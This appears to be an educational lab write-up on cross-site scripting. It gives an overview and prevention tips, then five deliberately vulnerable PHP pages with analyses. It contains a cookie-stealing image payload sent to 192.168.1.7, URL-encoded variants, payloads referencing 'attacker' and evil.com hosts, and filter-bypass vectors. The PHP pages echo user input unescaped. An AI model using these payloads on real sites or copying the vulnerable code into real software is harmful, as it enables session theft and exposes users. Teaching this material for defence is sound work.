
# Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** remains one of the most critical web security risks. It allows attackers to inject malicious scripts into trusted websites, causing visitors’ browsers to execute this untrusted code. This can lead to anything from **credential theft** to full system compromise.

### How XSS Works

- **Untrusted Data Input:** XSS occurs when user-supplied data is embedded in web pages without adequate validation or sanitization.
- **Script Execution:** Attackers typically inject **JavaScript** (but can use any browser-supported language), which executes whenever another user visits the maliciously crafted page or link, running in the context of the target site.

### Types of XSS Attacks
 
- **Reflected XSS:** The payload is reflected off a web server, usually via URL parameters, and executed immediately in the victim’s browser.
- **Stored (Persistent) XSS:** The payload is stored on the server (e.g., in a database) and then delivered to and executed by each user who views the affected content.
- **DOM-based XSS:** The vulnerability is in client-side JavaScript code; the malicious changes happen when the DOM is insecurely manipulated, possibly without ever reaching the server.

### Risks and Impact

- **Theft of authentication cookies, session tokens, or sensitive user data.**
- **User impersonation, keylogging, phishing, or malware installation.**
- **Content modification:** including website defacement or redirecting users to malicious sites.
- **Prevalence:** XSS’s occurrence has increased alongside more dynamic, JavaScript-driven web applications.
- **Severe impact:** If an admin account is compromised, XSS can enable attackers to take over the entire application or system.

### XSS Prevention Best Practices

- **Sanitize and Encode Inputs:** Always handle user input as untrusted. Encode all output according to context (HTML, JavaScript, CSS, URL, etc.).
- **Use Secure Frameworks or Libraries:** Utilize frameworks that automatically apply appropriate output encoding and help mitigate XSS risks.
- **Content Security Policy (CSP):** Implement strict CSP headers to prevent inline and unauthorized scripts. Example:

  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-src 'none'; base-uri 'none';
  ```

- **Regular Testing and Code Review:** Use security scanning tools (e.g., Burp Suite, OWASP ZAP) and conduct frequent code reviews to identify vulnerabilities.
- **Keep Dependencies Updated:** Many XSS incidents in 2025 still result from outdated third-party libraries or components. Regularly apply patches and updates.

**Proper prevention and vigilance are essential. If you need practical code examples or want to understand specific techniques (like CSP implementation or secure templating), just let me know!**


---

# XSS-Vulnerable-Code-Analysis

## **Cross-Site Scripting (XSS) Code Analysis and XSS Issue**
# 1. Vulnerable Example: `xss-1.php`
```php
xss-1.php
```
```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>XSS Vulnerability Lab</title>
</head>
<body>
<h1>Welcome To Armour Infosec</h1>

<?php
// Vulnerable: directly echoing user input without sanitization, intentional for lab purposes
if (isset($_REQUEST['user'])) {
    echo $_REQUEST['user'] . "!!";
}
?>

<p>Try injecting JavaScript or HTML code into the ‘user’ parameter in the URL to test reflected XSS:</p>
<pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>

</body>
</html>
```

---

## Code Analysis and XSS Issue

The PHP code you provided is intentionally written to be vulnerable, which makes it a perfect candidate for demonstrating reflected Cross-Site Scripting (XSS) for educational and lab purposes. Here's an analysis:

### Key Code

```php
if (isset($_REQUEST['user'])) {
    echo $_REQUEST['user'] . "!!";
}
```

---

## Vulnerability Explanation

* Direct Output of User Input:
  The core problem is that the code takes whatever is given in the `user` parameter (via GET, POST, or COOKIE), and directly outputs it to the web page without any form of sanitization, escaping, or validation.

* Result:
  If a user supplies a malicious payload—such as `<script>alert('XSS')</script>`—as the value of `user`, that JavaScript will be rendered and executed in the browser of anyone visiting that URL.

### Example:

```
http://yourlab.com/page.php?user=<script>alert('XSS')</script>
```

> This would cause a browser popup when that page is loaded.

---

## What Makes This Reflected XSS?

* The malicious payload is immediately “reflected” back in the HTTP response, rather than being stored on the server for later.
* The vulnerable code is using `$_REQUEST`, which combines GET, POST, and COOKIE variables, expanding the attack surface.
* Script Execution:
  Any visitor who clicks a crafted link or submits a manipulated form could have arbitrary JavaScript executed in their browser in the context of the vulnerable site.
* Cookie Theft:
  Attackers could use scripts to steal session cookies, hijack logins, or impersonate users.
* Session Security:
  The presence of `admin` cookies and session variables further increases attack value—they could be targeted for theft or manipulation.

---

## Common XSS Exploits (for Lab Purposes)

### 1. Basic Alert Payloads

* `alert(123);` — Displays a numeric popup alert.

```html
<script>alert(123);</script>
```

* `alert("Armour");` — Displays a popup with the text “Armour”.

```html
<script>alert("Armour");</script>
```

* `alert(document.domain);` — Shows the domain of the current document (used to confirm the site context).

```html
<script>alert(document.domain);</script>
```

* `alert(document.cookie);` — Displays the user's cookies stored for the site.

```html
<script>alert(document.cookie);</script>
```

> These are JavaScript alert popups enclosed in `<script>` tags.

> They are commonly used to test if XSS vulnerabilities exist by triggering a popup.

---

### 2. Cookie Theft via Image Request

```html
<script>
var i = new Image;
i.src = "http://192.168.1.7/?" + document.cookie;
</script>
```

* Creates a new JavaScript Image object without adding it to the page.
* Sets the image’s `src` attribute to a URL controlled by the attacker (`http://192.168.1.7/`), appending the victim’s cookie as a query parameter.
* When the browser tries to load this image, it sends the victim's cookies to the attacker's server—stealing session cookies or authentication tokens.

---

### 3. URL-Encoded Versions of the Above Payloads

```html
%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D'http%3A//192.168.1.7/?'%2Bdocument.cookie%3B%3C/script%3E
%3Cscript%3Evar%20i%3Dnew%20Image%3Bi.src%3D'http%3A//192.168.1.6/?'%2Bdocument.cookie%3B%3C/script%3E
```

* These are the URL-encoded versions of the image-based cookie theft payload.
* URL encoding is used to safely transmit special characters in URLs without breaking web requests or filters.
* When decoded, they become the same JavaScript payload as before.
* Attackers use URL-encoding to bypass input filters or WAFs that don't decode inputs before inspection.

---

### Payload Reference Table

| Payload                                                                            | Purpose                                          |
| ---------------------------------------------------------------------------------- | ------------------------------------------------ |
| `<script>alert(...);</script>`                                                     | Proof of XSS vulnerability (shows popup alert)   |
| `<script>alert(document.cookie);</script>`                                         | Test access to victim’s cookies                  |
| `<script>var i=new Image(); i.src="http://attacker/?" + document.cookie;</script>` | Steal cookies via HTTP request                   |
| `%3Cscript%3E...%3C/script%3E`                                                     | Encoded payload for bypassing input restrictions |

---

## Why Leave It Vulnerable?

For XSS labs and training, seeing raw, unsanitized output is essential for demonstrating the impact and exploitability of these attacks. It provides hands-on experience for attacking and later learning to defend real web applications.

---

# 2. Vulnerable Example: xss-2.php

```bash
vim xss-2.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>xXSS Lab - Partial Script Tag Filter</title>
</head>
<body>
<h1>Welcome To Armour Infosec</h1>
<?php
if (isset($_REQUEST['user'])) {
    // Intentionally simple removal of <script> tags only - still vulnerable to many XSS vectors
    $user = $_REQUEST['user'];
    $user = preg_replace("/<script>/i", "", $user);
    $user = preg_replace("/<\/script>/i", "", $user);
    echo $user . "!!";
}
?>
<p>Try injecting various XSS payloads into the <code>user</code> parameter:</p>
<pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
</body>
</html>
```

---

# 3. Vulnerable Example: xss-3.php

```bash
vim xss-3.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>xXSS Lab - Partial Script Tag Filter</title>
</head>
<body>
<h1>Welcome To Armour Infosec</h1>
<?php
if (isset($_REQUEST['user'])) {
    // Intentionally simple removal of <script> tags only - still vulnerable to many XSS vectors
    $user = $_REQUEST['user'];
    $user = preg_replace("/<script>/i", "", $user);
    $user = preg_replace("/<\/script>/i", "", $user);
    echo $user . "!!";
}
?>
<p>Try injecting various XSS payloads into the <code>user</code> parameter:</p>
<pre>?user=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
</body>
</html>
```

---

### Code Analysis and XSS Issue

The provided PHP code is intentionally vulnerable to **Reflected Cross-Site Scripting (XSS)**, making it suitable for educational purposes, such as a security lab.

---

#### Vulnerable Code Snippet:

```php
$user = preg_replace("/<script>/i", "", $user);
$user = preg_replace("/<\/script>/i", "", $user);
echo $user . "!!";
```

---

### What's Happening?

* **User Input**: The value of the `user` parameter from the HTTP request (`GET`, `POST`, or `COOKIE`) is accessed directly.
* **Partial Filtering**: The code attempts to remove only the literal `<script>` and `</script>` tags using a case-insensitive regex.
* **Output**: The (partially filtered) user input is echoed back directly into the HTML response without further encoding or sanitization.

---

### Why This Is Vulnerable

* **Insufficient Filtering**: Removing only `<script>` tags is minimal protection.
* **Alternate Tags**: Attackers can use `<img>`, `<svg>`, `<iframe>`, or event handlers like `onerror`, `onload`, `onclick`.
* **Script Tag Variants**: Mixed case, added attributes, comment delimiters, or spacing bypass the filters.
* **Obfuscation**: HTML entities and URL encoding are not addressed.
* **Direct Output**: Since user input is echoed directly, the browser interprets it as HTML/JS.

---

### Example Attack Vectors That Bypass This Code

| Payload                                       | Explanation                           |
| --------------------------------------------- | ------------------------------------- |
| `<img src=x onerror=alert('XSS')>`            | Uses event handler, no `<script>` tag |
| `<ScRipT>alert('XSS')</scripT>`               | Mixed case bypass                     |
| `<script src="http://evil.com/malicious.js">` | External script, partially filtered   |
| `"><svg/onload=alert('XSS')>`                 | Uses SVG and event attribute          |
| `&lt;script&gt;alert('xss')&lt;/script&gt;`   | Encoded entities, not removed         |

---

### Impact

* **Code Execution** in victim's browser.
* **Session Theft** through cookie access.
* **User Impersonation or Phishing** via DOM manipulation.
* **Potential Full Account Takeover**, especially when combined with other bugs.

---

### Why Regex Filtering Is Inadequate

* HTML is **too flexible and complex** to be reliably filtered with regular expressions.
* Regex can't **understand context** (e.g., attributes, nested tags, encoded forms).

---

### Summary

* The code attempts minimal filtering targeting only `<script>` tags.
* Leaves many XSS vectors **untouched**, making it a vulnerable example.
* Demonstrates the **pitfalls of naive XSS filtering**.
* Proper defense requires:

  * **Contextual output encoding** (e.g., `htmlspecialchars()` in PHP),
  * Use of **security libraries** and frameworks,
  * **Input validation** and sanitization beyond regex.

---

# 4. Vulnerable Example: xss-4.php

```php
xss-4.php
```
```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>xSS Lab - Simple Script Filter</title>
</head>
<body>
  <h1>Welcome To Armour Infosec</h1>
  <?php
  if (isset($_REQUEST['user'])) {
      $user = $_REQUEST['user'];
      // Simple case-insensitive filter for "script" keyword -- intentionally naive
      if (preg_match('/script/i', $user)) {
          die("Error");
      } else {
          // Output user input directly, no sanitization or encoding
          echo $user . "!!";
      }
  }
  ?>
</body>
</html>
```

---

## Code Analysis and XSS Issue

The provided PHP code snippet is designed to demonstrate a partially filtered but still vulnerable scenario for learning about Cross-Site Scripting (XSS) attacks in a lab environment.

---

### What the Code Does

```php
1  $user = $_REQUEST['user'];
2  if (preg_match('/script/i', $user)) {
3      die("Error");
4  } else {
5      echo $user . "!!";
6  }
```

* It takes user input from any HTTP request parameter named `user`.
* It checks if the string `"script"` (case-insensitive) appears anywhere in the input.
* If yes, it terminates execution and returns `"Error"`.
* If no, it outputs the user input directly without any encoding or further sanitization, followed by `"!!"`.

---

### Why This Code Is Still Vulnerable to XSS

#### 1. Naive Filtering

The filter only looks for the keyword `"script"`. However:

* Many XSS payloads do not use `<script>` tags.
* Tags such as `<img>`, `<svg>`, `<iframe>`, or event handlers like `onerror`, `onload`, `onclick` can execute JavaScript without containing the word `"script"`.
* Attackers may obfuscate payloads by inserting spaces, using different cases, or splitting the word “script” to circumvent the filter.

#### 2. No Output Encoding

Even inputs that do not contain `"script"` are echoed raw inside the HTML page. This enables injection of arbitrary HTML and JavaScript.

#### 3. Attack Surface via `$_REQUEST`

Because `$_REQUEST` includes query parameters, POST data, and cookies, this broadens opportunities for injection vectors.

---

### Example Bypasses for the Filter

These payloads do **not** contain the string `"script"` but can **still execute JavaScript**:

- Image tag with error handler
```php
<img src="x" onerror="alert('XSS')">
```
- SVG tag with load handler
```php
<svg onload="alert('XSS')">
```
- Body tag with load handler
```php
<body onload="alert('XSS')">
```
- Anchor tag with javascript: protocol 
```php
<a href="javascript:alert('XSS')">Click me</a>
```
- Form tag with javascript: protocol
```php
<form action="javascript:alert('XSS')">
```
---

### Lab Use Case

* This partial filter simulates a realistic but flawed defense seen in some poorly protected web apps.
* It allows learners to practice generating valid XSS payloads that bypass simple keyword blocking, improving understanding of modern XSS attack vectors.
* The direct echoing of unsanitized content shows the importance of context-aware encoding and input validation.


### Summary Table

| Filter Behavior                                           | Vulnerability                                        | Attack Vectors                                     | Risk                                                                     | Educational Use                              |
| --------------------------------------------------------- | ---------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------ | -------------------------------------------- |
| Blocks any input containing `"script"` (case-insensitive) | Allows any HTML or JS input without `"script"` in it | Event handlers, other HTML tags, obfuscated inputs | Reflected XSS leading to cookie theft, session hijacking, phishing, etc. | Teaching bypass techniques for naive filters |

---


# 5. Vulnerable Example: `xss-5.php`

```php
xss-5.php
```

```php
<?php
session_start();
setcookie('admin', 'admin', time() + (60 * 60 * 24 * 7));
$_SESSION['admin'] = 'admin';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>XSS Lab - Simple Alert Filter</title>
</head>
<body>
  <h1>Welcome To Armour Infosec</h1>
  <?php
  if (isset($_REQUEST['user'])) {
      $user = $_REQUEST['user'];
      // Naive filter to block inputs containing 'alert' (case-insensitive)
      if (preg_match('/alert/i', $user)) {
          die("Error");
      } else {
          // Output unsanitized user input - vulnerable to XSS
          echo $user . "!!";
      }
  }
  ?>
</body>
</html>
```

---

## How the Code Works

* Initializes a PHP session and sets a cookie named `admin`.
* Takes user input from the `user` parameter via `$_REQUEST`.
* Filters the input using a regular expression that blocks any string containing the word `alert`, regardless of case.
* If the input does not contain `alert`, it is echoed directly to the HTML response without any sanitization.

---

## Why This is Vulnerable

### 1. Incomplete Filtering

* The code only filters out the word `alert`.
* Other JavaScript functions like `confirm`, `prompt`, or `console.log` are still allowed.
* Event handler attributes like `onerror`, `onload`, etc., are not blocked.

### 2. No Output Encoding

* User input is echoed directly into the page.
* There is no escaping of special characters (like `<`, `>`, `"`, `'`), which allows HTML/JavaScript injection.

---

## Exploitation Examples

### JavaScript Execution via Alternative Functions

```html
<script>confirm(1)</script>
<script>prompt(1)</script>
```

### JavaScript Event Handlers in HTML Tags

```html
<img src=x onerror=confirm(1)>
<svg onload=confirm(1)>
```

### Arbitrary HTML Injection

```html
<h1 style="color:red" onmouseover="console.log(1)">Hover Me</h1>
```

### JavaScript URL Vectors

```html
<a href="javascript:console.log(1)">Click me</a>
```

---

## Key Security Issues

| Issue                     | Explanation                                               |
| ------------------------- | --------------------------------------------------------- |
| Keyword-based filtering   | Blocks only `alert`, missing other JS vectors             |
| No HTML context awareness | No handling for input inside attributes, tags, or scripts |
| No output encoding        | Input is rendered directly into HTML without escaping     |
| Overly permissive input   | Accepts data from GET, POST, and COOKIE via `$_REQUEST`   |

---

## Lessons and Takeaways

* Blacklists are ineffective and easy to bypass.
* Always encode user input before output, based on context (HTML, JS, attribute, URL).
* Input validation should be paired with strict output encoding.
* Never rely on keyword filters as a defense mechanism.
* Use security libraries and frameworks that handle encoding automatically (e.g., OWASP ESAPI, output encoding functions in modern frameworks).

---


